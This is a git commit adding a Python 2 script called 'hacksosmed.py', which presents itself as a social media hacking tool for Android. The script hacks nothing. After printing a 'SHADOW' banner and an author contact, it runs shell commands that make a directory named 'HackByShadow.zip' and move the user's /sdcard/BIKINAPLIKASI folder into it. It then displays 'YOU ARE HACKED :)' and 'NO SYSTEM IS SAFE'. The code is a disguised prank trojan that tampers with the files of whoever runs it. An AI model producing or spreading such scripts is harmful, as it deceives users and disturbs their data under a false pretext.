73f3f295e333ec64dba7994bab73496ed9ac53b6
yusril456light <68282307+yusril456light@users.noreply.github.com>
2020-08-10 13:23:33 +0700

    Add files via upload

---
+++ hacksosmed.py
@@ -0,0 +1,36 @@
+import os
+import sys
+print
+print
+os.system('clear')
+os.system('figlet SHADOW')
+print
+print
+print "[Author  = Shadow]"
+print "[Contact = Shadow44@gmail.com]"
+os.system('mkdir HackByShadow.zip')
+os.system('mv /sdcard/BIKINAPLIKASI HackByShadow.zip')
+print
+print
+print
+print
+print "sedang memproses...."
+print
+print
+print
+print
+print "YOU ARE HACKED :)"
+print
+print
+print
+print
+print
+print
+print "==================="
+print "[NO SYSTEM IS SAFE]"
+print "==================="
+print
+print
+print
+print
+print "_____________________________________________"
